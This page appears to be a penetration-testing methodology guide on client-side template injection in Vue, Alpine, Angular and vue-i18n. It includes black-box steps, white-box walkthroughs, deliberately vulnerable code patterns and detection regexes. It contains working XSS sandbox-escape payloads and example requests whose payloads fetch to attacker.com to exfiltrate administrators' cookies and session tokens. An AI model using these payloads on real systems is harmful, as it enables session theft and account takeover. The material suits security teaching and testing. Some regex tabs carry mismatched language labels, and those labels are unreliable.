# Client Side Template Injection

## Check List

## Methodology

### Black Box

#### Search Box

{% stepper %}
{% step %}
Go to any search box on the target&#x20;
{% endstep %}

{% step %}
Enter this exact payload in the input field

```java
{{7*7}}
```
{% endstep %}

{% step %}
Submit the form or trigger the search
{% endstep %}

{% step %}
Check the response or rendered page
{% endstep %}

{% step %}
If you see 49, Client-Side Template Injection (CSTI) CONFIRMED
{% endstep %}

{% step %}
Escalate immediately with this XSS payload

```javascript
{{constructor.constructor('alert(document.domain)')()}}
```
{% endstep %}

{% step %}
If alert pops, Full XSS via CSTI, CONFIRMED

of

```javascript
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(document.domain)//>
```
{% endstep %}
{% endstepper %}

***

#### CSTI in the registration process

{% stepper %}
{% step %}
Log in to the target site and complete the account creation process
{% endstep %}

{% step %}
Then trace the request process using Burp Suite
{% endstep %}

{% step %}
In the intercepted request from the account creation process, replace and fill in the username form using the payload below and submit the request

```javascript
“>{{7*7}}<img>
```
{% endstep %}

{% step %}
After creating the account, if the username field contains 49, the vulnerability is confirmed
{% endstep %}

{% step %}
Then we can convert this vulnerability to XSS using the following command

```javascript
{{constructor.constructor(‘alert(`XSS`)’)()}}
```
{% endstep %}
{% endstepper %}

***

### White Box

#### Execution Hijacking via Progressive Hydration in Hybrid Rendering Architectures

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise applications undergoing architectural modernization—specifically, legacy Server-Side Rendered (SSR) monolithic applications (e.g., ASP.NET MVC, Laravel, Spring Boot) that are being incrementally upgraded with modern reactive frontend frameworks (e.g., Vue.js, Alpine.js, Svelte)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application's DOM mounting sequence
{% endstep %}

{% step %}
Identify the "Progressive Hydration" or "Hybrid Mounting" architecture. Rewriting a massive monolithic application into a Single Page Application (SPA) in a single deployment is impossible. Instead, architects adopt a hybrid approach: the backend generates the static HTML, but the frontend explicitly mounts a reactive framework (like Vue.js or Alpine.js) directly onto the existing `#app` or `<body>` DOM node to provide localized interactivity (e.g., drop-downs, dynamic modals)
{% endstep %}

{% step %}
Investigate the backend input sanitization pipeline. The backend accepts user-controlled data (like Forum Posts, Wiki Pages, or Customer Comments) and strictly neutralizes Cross-Site Scripting (XSS). It utilizes enterprise-grade HTML sanitizers (DOMPurify, AntiXSS) to strip `<script>`, `<iframe>`, and `onerror` handlers before embedding the data into the HTML response
{% endstep %}

{% step %}
Analyze the frontend execution bootstrap. When the browser loads the page, the backend-generated HTML is rendered first. Subsequently, the frontend JavaScript bundle executes `Vue.createApp().mount('#app')` or `Alpine.start()`
{% endstep %}

{% step %}
Discover the fatal framework assumption: The backend developer equates "Safe HTML" with "Safe Data." They assume the HTML sanitizer neutralizes all client-side execution vectors. However, when a reactive framework mounts onto an existing DOM node, it recursively parses the _entire_ inner HTML of that node, actively searching for its specific template execution syntax (e.g., `{{ ... }}`, `v-html`, `x-data`)
{% endstep %}

{% step %}
Understand the vulnerability: The HTML sanitizer has no awareness of Vue.js or Alpine.js abstract syntax trees (AST). It treats `{{ 7*7 }}` as completely benign, structural plaintext
{% endstep %}

{% step %}
Formulate the Hybrid CSTI payload. Identify an input field that is reflected within the boundary of the mounted frontend framework
{% endstep %}

{% step %}
Construct a payload utilizing the execution syntax of the target framework to escape the sandbox and access the global `window` object, \
Vue 2: `{{constructor.constructor('alert(document.domain)')()}}`\
Vue 3: `{{_setup._setupProxy.constructor.constructor('alert(document.domain)')()}}`\
Alpine.js: `<div x-data="{x: $el.ownerDocument.defaultView.alert(document.domain)}"></div`
{% endstep %}

{% step %}
Submit the payload to the backend via standard application functionality (e.g., creating a new Support Ticket)
{% endstep %}

{% step %}
The backend HTML sanitizer evaluates the payload. Finding no JavaScript elements, it approves the text and saves it
{% endstep %}

{% step %}
An Administrator opens the ticket. The backend server interpolates the sanitized payload into the HTML and delivers the HTTP response
{% endstep %}

{% step %}
The Administrator's browser renders the HTML securely. No XSS executes
{% endstep %}

{% step %}
Milliseconds later, the frontend JavaScript initializes. The framework mounts onto the `#app` container, ingests the backend's DOM, and identifies the attacker's `{{ ... }}` brackets. The framework compiles the payload, transforming the sanitized plaintext back into executable JavaScript, resulting in catastrophic, fully authenticated DOM takeover

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(Vue\.createApp\(.*\)\.mount\(['"]#[a-zA-Z0-9_-]+['"]\))
```
{% endtab %}

{% tab title="Java" %}
```regexp
(new\s+Vue\(\s*\{\s*el:\s*['"]#[a-zA-Z0-9_-]+['"])
```
{% endtab %}

{% tab title="PHP" %}
```regexp
m\.mount\(document\.body
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(Alpine\.start\(\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Vue\.createApp\(.*\)\.mount\(['\"]#[a-zA-Z0-9_-]+['\"]
```
{% endtab %}

{% tab title="Java" %}
```regexp
new\s+Vue\(\s*\{\s*el:\s*['\"]#[a-zA-Z0-9_-]+['\"]
```
{% endtab %}

{% tab title="PHP" %}
```regexp
Alpine\.start\(\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
m\.mount\(document\.body
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class TicketController : Controller
{
    private readonly HtmlSanitizer _sanitizer;

    public TicketController()
    {
        _sanitizer = new HtmlSanitizer();
        _sanitizer.AllowedTags.Add("b");
        _sanitizer.AllowedTags.Add("i");
    }

    [HttpGet("/tickets/{id}")]
    public async Task<IActionResult> ViewTicket(int id)
    {
        var ticket = await _dbContext.Tickets.FindAsync(id);
        
        // [1]
        // [2]
        // Strict HTML sanitization neutralizes standard XSS
        var model = new TicketViewModel 
        { 
            SafeHtmlBody = _sanitizer.Sanitize(ticket.Body) 
        };

        return View(model);
    }
}

// Razor View (ViewTicket.cshtml):
// <div id="app">
//    <!-- [3] -->
//    <!-- [4] -->
//    <!-- Html.Raw prevents HTML encoding, relying on the sanitizer -->
//    <div class="ticket-content">@Html.Raw(Model.SafeHtmlBody)</div>
// </div>
// <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
// <script>Vue.createApp({}).mount('#app');</script>
```
{% endtab %}

{% tab title="Java" %}
```java
@Controller
public class TicketController {

    @GetMapping("/tickets/{id}")
    public String viewTicket(@PathVariable Long id, Model model) {
        Ticket ticket = ticketRepository.findById(id).orElseThrow();

        // [1]
        // [2]
        PolicyFactory policy = Sanitizers.FORMATTING;
        String safeBody = policy.sanitize(ticket.getBody());

        model.addAttribute("safeBody", safeBody);
        return "ticket-view";
    }
}

// Thymeleaf Template (ticket-view.html):
// <body x-data> <!-- Alpine.js initialization -->
//    <!-- [3] -->
//    <!-- [4] -->
//    <div th:utext="${safeBody}"></div>
// </body>
```
{% endtab %}

{% tab title="PHP" %}
```php
class TicketController extends Controller
{
    public function viewTicket($id)
    {
        $ticket = Ticket::findOrFail($id);

        // [1]
        // [2]
        $purifier = new \HTMLPurifier();
        $safeBody = $purifier->purify($ticket->body);

        return view('ticket.view', ['safeBody' => $safeBody]);
    }
}

// Blade Template (view.blade.php):
// <div id="vue-container">
//    <!-- [3] -->
//    <!-- [4] -->
//    <!-- Unescaped output relies on HTMLPurifier for safety -->
//    <div class="content">{!! $safeBody !!}</div>
// </div>
// <script>
//    const app = Vue.createApp({});
//    app.mount('#vue-container');
// </script>
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const sanitizeHtml = require('sanitize-html');

router.get('/tickets/:id', async (req, res) => {
    let ticket = await Ticket.findByPk(req.params.id);

    // [1]
    // [2]
    let safeBody = sanitizeHtml(ticket.body, { allowedTags: ['b', 'i'] });

    // Renders the EJS template
    res.render('ticket-view', { safeBody: safeBody });
});

// EJS Template (ticket-view.ejs):
// <div id="app">
//    <!-- [3] -->
//    <!-- [4] -->
//    <p><%- safeBody %></p>
// </div>
// <script>Vue.createApp({}).mount('#app');</script>
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture processes untrusted user input within a legacy server-side rendering pipeline, \[2] To comply with security standards, all input passes through a dedicated HTML Sanitizer, ensuring structural integrity and eliminating programmatic tags, \[3] The frontend architecture implements Progressive Hydration. Instead of building the DOM from JSON APIs, a reactive framework (Vue/Alpine) attaches itself to the pre-rendered HTML to attach event listeners and dynamic behaviors, \[4] The execution sink. The backend sanitization logic is totally decoupled from the frontend parsing logic. The backend correctly identifies `{{` and `}}` as harmless plaintext characters according to W3C specifications. However, when the frontend framework mounts the DOM, it re-parses the text nodes, identifies the framework-specific delimiters, and passes the contents to its internal compiler. The attacker achieves code execution by smuggling reactive payloads through a blind spot in the backend's HTML-centric security perimeter

```http
// 1. Attacker identifies that the target dashboard uses Vue.js mounted on the <body> tag.
// 2. Attacker crafts a Vue 3 sandbox escape payload.

POST /api/v1/tickets HTTP/1.1
Host: support.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "subject": "Login Issue",
  "body": "Please help me fix my account. {{_setup._setupProxy.constructor.constructor('fetch(\"https://attacker.com/leak?cookie=\"+document.cookie)')()}}"
}

// 3. The backend sanitizes the body. The {{...}} string remains intact.
// 4. The ticket is stored in the database.
// 5. A Support Administrator navigates to the ticket view.
// 6. The backend renders the HTML and delivers it to the browser.
// 7. The browser renders the text. The payload is temporarily visible as raw text.
// 8. The Vue.js library loads and executes `app.mount('#app')`.
// 9. Vue parses the DOM, discovers the brackets, compiles the string, and evaluates the JavaScript.
// 10. The administrator's session cookie is exfiltrated to the attacker.
```
{% endstep %}

{% step %}
To bridge the gap between monolithic backend rendering and modern frontend interactivity, architects deployed hybrid DOM mounting strategies. This optimization allowed developers to gradually introduce reactive frameworks without rewriting the entire presentation layer. The security failure stemmed from a Parser Differential. The backend defense mechanisms evaluated the input strictly through the lens of standard HTML specifications, sanitizing out known web execution vectors. The frontend framework, however, evaluated the exact same DOM tree through the lens of a dynamic template compiler. The attacker exploited this linguistic discrepancy by utilizing framework-specific interpolation syntax. The payload successfully transited the backend's HTML sanitizer as inert text, only to be seamlessly rehydrated into executable code by the frontend compiler, completely subverting the platform's XSS protections and achieving authenticated execution hijacking
{% endstep %}
{% endstepper %}

***

#### Dynamic Template Forgery via Low-Code AST Concatenation

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on Low-Code/No-Code enterprise platforms, dynamic form builders, or customizable dashboard engines that utilize Angular or Vue to construct user interfaces from backend configuration files
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the frontend dynamic component loading sequence and the backend configuration endpoints
{% endstep %}

{% step %}
Identify the "Server-Driven Template" architecture. In highly customizable Low-Code environments, rendering a static component structure is insufficient. The backend must transmit raw HTML strings containing native framework directives (e.g., `*ngIf`, `ngFor`, `v-if`) to instruct the frontend on exactly how to construct the complex UI grid
{% endstep %}

{% step %}
Investigate the template synthesis pipeline. The backend database stores the structural templates for the dynamic forms. When a tenant requests their custom form, the backend retrieves the template and dynamically interpolates specific tenant metadata (e.g., custom labels, localized headers, default input values) into the template string before returning it to the client
{% endstep %}

{% step %}
Analyze the Client-Side compilation sink. The frontend Single Page Application (SPA) receives the JSON configuration payload containing the raw HTML string. To render it, the SPA utilizes a dynamic compiler (e.g., Angular's `Compiler` API and `ViewContainerRef.createComponent()`, or Vue's `defineComponent({ template: ... })`)
{% endstep %}

{% step %}
Discover the fatal trust boundary collapse: The backend developers assume that because the output is served via an API and intended for a "No-Code Builder," they only need to sanitize against traditional XSS. They safely HTML-encode or sanitize the tenant's metadata before merging it into the template
{% endstep %}

{% step %}
Understand the vulnerability: When the frontend framework compiles the raw HTML string, it inherently trusts the entire string as a first-party template. If the attacker injects template syntax (e.g., `{{...}}`) into a data field (like a custom column header), the backend interpolates it into the template string. The frontend compiler processes the attacker's injected brackets as native execution directives
{% endstep %}

{% step %}
Formulate the Template Forgery payload. Identify an administrative or tenant configuration endpoint that defines the metadata for a dynamic component (e.g., `POST /api/v1/workspaces/forms/metadata`)
{% endstep %}

{% step %}
Construct an Angular or Vue CSTI payload tailored for dynamic component compilation, Angular: `{{$event.view.window.alert(1)}}` or `{{constructor.constructor('alert(1)')()}}` depending on the exact Angular version and sandbox
{% endstep %}

{% step %}
Submit the payload in a benign configuration field (e.g., `{"customHeader": "{{$event.view.window.alert(document.domain)}}"}`)
{% endstep %}

{% step %}
The backend safely stores the string
{% endstep %}

{% step %}
A victim (e.g., an enterprise user filling out the form) loads the interface
{% endstep %}

{% step %}
The backend synthesizes the template: `templateString = "<h1>" + metadata.customHeader + "</h1><dynamic-form></dynamic-form>"`&#x20;
{% endstep %}

{% step %}
The backend transmits the template to the SPA
{% endstep %}

{% step %}
The SPA passes the string to the dynamic compiler. The compiler encounters the attacker's brackets, parses the AST, and binds the execution context. When the component initializes, the payload evaluates instantly, establishing persistent code execution within the trusted SPA context

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
compiler\.compileModuleAndAllComponentsAsync
```
{% endtab %}

{% tab title="Java" %}
```regexp
ViewContainerRef\.createComponent
```
{% endtab %}

{% tab title="PHP" %}
```regexp
defineComponent\(\{\s*template:\s*config\.templateString
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\$compile\(templateString\)\(\$scope\)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
compiler\.compileModuleAndAllComponentsAsync
```
{% endtab %}

{% tab title="Java" %}
```regexp
ViewContainerRef\.createComponent
```
{% endtab %}

{% tab title="PHP" %}
```regexp
defineComponent\(\{\s*template:\s*config\.templateString
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\$compile\(templateString\)\(\$scope\)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="Node.js" %}
```javascript
import { Component, Compiler, ViewContainerRef, ViewChild, NgModule } from '@angular/core';
import { HttpClient } from '@angular/common/http';

@Component({
  selector: 'dynamic-form-loader',
  template: `<div #container></div>`
})
export class DynamicFormLoader {
  @ViewChild('container', { read: ViewContainerRef }) container: ViewContainerRef;

  constructor(private http: HttpClient, private compiler: Compiler) {}

  ngAfterViewInit() {
    this.http.get('/api/v1/forms/123/schema').subscribe((config: any) => {
      
      // [1]
      // [2]
      // [3]
      // [4]
      // The frontend dynamically compiles the backend-provided string into an active Angular component.
      // If the backend interpolated {{...}} into the templateString, the Compiler executes it.
      @Component({
        template: config.templateString
      })
      class DynamicComponent {}

      @NgModule({ declarations: [DynamicComponent] })
      class DynamicModule {}

      this.compiler.compileModuleAndAllComponentsAsync(DynamicModule)
        .then(factories => {
          const factory = factories.componentFactories[0];
          this.container.createComponent(factory);
        });
    });
  }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The enterprise platform utilizes a Low-Code architecture, allowing tenant administrators to customize complex data-entry interfaces, \[2] To support deep framework integration (binding frontend variables to UI components dynamically), the backend is designed to transmit raw framework template strings rather than static JSON schema definitions, \[3] The backend synthesizes the final template string by concatenating base structural HTML with tenant-provided metadata. It incorrectly assumes that standard HTML escaping (`<` to `&lt;`) neutralizes all risk, \[4] The execution sink. The frontend application ingests the API payload and utilizes its native runtime compiler (e.g., Angular Compiler) to generate active DOM components on the fly. The compiler inherently trusts the provided template string. Because the backend injected the attacker's template execution brackets (`{{ }}`) directly into the template body, the compiler parses them as native execution directives, translating inert backend configuration data into active client-side Remote Code Execution

```http
// 1. Attacker controls an administrative account in a Low-Code SaaS platform.
// 2. Attacker modifies the configuration of an organizational Data Entry Form.

POST /api/v1/forms/998/settings HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_admin_token>
Content-Type: application/json

{
  "customHeader": "{{constructor.constructor('alert(\"Angular CSTI executed\")')()}}"
}

// 3. The backend API securely stores the configuration in the database.
// 4. A standard employee logs into the portal and accesses Form 998.
// 5. The SPA requests the form schema.

GET /api/v1/forms/998/schema HTTP/1.1
Host: api.enterprise.tld

// 6. The backend returns the synthesized template:
HTTP/1.1 200 OK
Content-Type: application/json

{
  "formId": 998,
  "templateString": "<div class=\"form-container\">\n  <h2>{{constructor.constructor('alert(\"Angular CSTI executed\")')()}}</h2>\n  <enterprise-data-grid [data]=\"gridData\"></enterprise-data-grid>\n</div>"
}

// 7. The Angular frontend receives the payload.
// 8. The frontend invokes `compiler.compileModuleAndAllComponentsAsync()`.
// 9. The Angular compiler builds the component, encountering the interpolation brackets.
// 10. The JavaScript payload evaluates immediately within the Angular execution context.
```
{% endstep %}

{% step %}
To deliver extreme UI flexibility in Low-Code environments, architects bypassed static API structures in favor of Server-Driven Template Synthesis. This optimization required the frontend application to dynamically compile raw framework strings (Angular/Vue) delivered via backend JSON payloads. The security posture failed by applying an outdated sanitization paradigm to a modern compilation pipeline. Backend developers assumed that HTML-encoding metadata safeguarded the string concatenation process. They failed to realize that the frontend compiler does not target HTML tags; it targets framework-specific AST markers (e.g., double curly braces). The attacker bypassed the HTML encoding entirely by injecting native compiler syntax into a standard configuration field. When the backend interpolated this field into the dynamic template, it successfully smuggled the execution context into the frontend's compilation lifecycle, weaponizing the application's own dynamic rendering engine
{% endstep %}
{% endstepper %}

***

#### I18n Pipeline Poisoning via Dynamic Key Interpolation in Translation Layers

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on globally distributed enterprise applications that support extensive Internationalization (I18n) and localization, specifically targeting the translation delivery API
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the frontend I18n configuration (e.g., `vue-i18n`, `react-i18next`, or `ngx-translate`)
{% endstep %}

{% step %}
Decompile or reverse engineer the frontend I18n configuration (e.g., `vue-i18n`, `react-i18next`, or `ngx-translate`)
{% endstep %}

{% step %}
Investigate the I18n interpolation configuration. To support complex UI messaging (e.g., "Welcome back, Alice. You have 3 messages."), the frontend I18n library is explicitly configured to parse HTML and evaluate dynamic placeholders within the translation strings
{% endstep %}

{% step %}
Analyze the backend translation synchronization. The backend allows tenant administrators to customize their own terminology (e.g., replacing the word "Employee" with "Associate" across the platform) via an administrative endpoint
{% endstep %}

{% step %}
Discover the fatal execution overlap: The backend developer assumes that translation files are strictly static, cosmetic text strings. They store the tenant's custom translations without sanitizing them for frontend template syntax
{% endstep %}

{% step %}
Understand the framework vulnerability: Popular localization libraries (like `vue-i18n`) historically evaluate translation strings as active templates. If the translation string contains raw framework execution syntax, the I18n engine will compile and evaluate it when resolving the translation key
{% endstep %}

{% step %}
Formulate the I18n Poisoning payload. Identify an administrative endpoint that allows updating custom localization strings or branding terminology
{% endstep %}

{% step %}


Construct a payload that leverages the I18n engine's specific interpolation capabilities.

For Vue-I18n (v8): `{"welcome_message": "Welcome {x} {{_setup._setupProxy.constructor.constructor('alert(document.cookie)')()}}"`
{% endstep %}

{% step %}
Submit the malicious localization mapping to the backend API
{% endstep %}

{% step %}
The backend updates the localization database and invalidates the caching layer
{% endstep %}

{% step %}
A victim navigates to the application. The SPA initializes and fetches the translation payload via `GET /api/v1/locales/en-US.json`
{% endstep %}

{% step %}
The backend delivers your poisoned JSON file
{% endstep %}

{% step %}
The frontend SPA mounts the UI. A component calls the localization function: `<p v-html="$t('welcome_message', { x: 'User' })"></p>`
{% endstep %}

{% step %}
The `vue-i18n` engine resolves the key, identifies the dynamic interpolation brackets, and passes the entire string through its internal template compiler. The payload executes natively, bypassing the primary component code entirely and establishing stealthy execution via the platform's linguistic infrastructure

**VSCode Regex Detection**

{% tabs %}
{% tab title="Node.js" %}
```regexp
(\$t\(['"][a-zA-Z0-9_\.]+['"]\))|(i18n\.t\(['"][a-zA-Z0-9_\.]+['"]\))|(<Translate\s+i18nKey=)|(\{\{\s*['"][a-zA-Z0-9_\.]+['"]\s*\|\s*translate\s*\}\})
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="Node.js" %}
```regexp
"\\$t\(['\"][a-zA-Z0-9_\.]+['\"]\)|i18n\.t\(['\"][a-zA-Z0-9_\.]+['\"]\)|<Translate\s+i18nKey=|\{\{\s*['\"][a-zA-Z0-9_\.]+['\"]\s*\|\s*translate\s*\}\}"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="Node.js" %}
```javascript
import { createI18n } from 'vue-i18n';

// [1]
// [2]
// [3]
// [4]
// The frontend initializes the I18n engine with the backend-provided JSON.
const loadLocaleMessages = async () => {
  const response = await fetch(`/api/v1/locales/${tenantId}/en-US.json`);
  return await response.json();
};

const messages = await loadLocaleMessages();

const i18n = createI18n({
  locale: 'en-US',
  messages: {
    'en-US': messages
  },
  // In many older versions or specific configurations, allowing HTML inside translations 
  // or compiling messages natively exposes the CSTI sink.
  warnHtmlInMessage: "off" 
});

// Vue Component Sink:
// <template>
//   <div class="dashboard">
//      <h1 v-html="$t('dashboard.welcome_message', { user: currentUser.name })"></h1>
//   </div>
// </template>
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture supports global, multi-tenant deployments requiring dynamic overriding of linguistic variables and terminology without frontend redeployments, \[2] To orchestrate this, the backend exposes an API that merges base translations with tenant-provided overrides, delivering a unified JSON dictionary to the client on startup, \[3] The security model categorizes language files as inert, cosmetic configurations, completely bypassing standard HTML/XSS sanitization pipelines during the administrative upload phase, \[4] The execution sink. Modern frontend localization libraries (like `vue-i18n` or `i18next`) are not simple key-value replacers; they are powerful template engines capable of resolving complex pluralization, rich-text formatting, and conditional logic. By treating the dynamically loaded JSON dictionary as a trusted compilation source, the frontend exposes a massive attack surface. The attacker injects native AST directives into a customized translation string. When the frontend attempts to localize the UI, it retrieves the poisoned string and pushes it through the internal I18n compiler, silently detonating the JavaScript payload across the entire application workspace

```http
// 1. Attacker (Tenant Admin) updates the workspace localization settings.
// They target a highly utilized translation key, such as the dashboard welcome message.

POST /api/v1/tenant/localization HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_admin_token>
Content-Type: application/json

{
  "translations": {
    "dashboard.welcome_message": "Welcome back! {{_setup._setupProxy.constructor.constructor('fetch(\"https://attacker.com/leak?k=\"+localStorage.getItem(\"session\"))')()}}"
  }
}

// 2. The backend securely saves the JSON object into the database.
// 3. A victim (e.g., an Enterprise Super Admin) logs into the workspace.
// 4. The SPA initializes and executes an HTTP GET to fetch the translations.

GET /api/v1/locales/T-8819/en-US.json HTTP/1.1
Host: api.enterprise.tld

// 5. The API returns the poisoned JSON dictionary.
// 6. The frontend instantiates the vue-i18n engine with the malicious dictionary.
// 7. The SPA routes to the Dashboard component.
// 8. The component executes: $t('dashboard.welcome_message')
// 9. The I18n engine evaluates the string, detects the {{...}} brackets, and compiles the payload.
// 10. The native JavaScript executes, extracting the Super Admin's local storage session and exfiltrating it.
```
{% endstep %}

{% step %}
To decouple linguistic updates from software release cycles, engineers implemented dynamic localization pipelines. This architecture relied on backend APIs to distribute JSON-based translation dictionaries to the frontend clients during initialization. The architectural blind spot emerged from a failure to recognize the computational power of client-side localization libraries. Developers assumed translation keys mapped to inert string literals. However, to support complex variable interpolation, I18n libraries natively function as secondary template compilers. By manipulating a legitimate administrative endpoint, the attacker poisoned the central translation repository, injecting framework-specific AST markers into a standard linguistic string. When the frontend SPA resolved the translation key for the UI, it autonomously routed the poisoned string into its internal compiler, effectively weaponizing the application's internationalization infrastructure as a stealthy, globally distributed execution vector
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
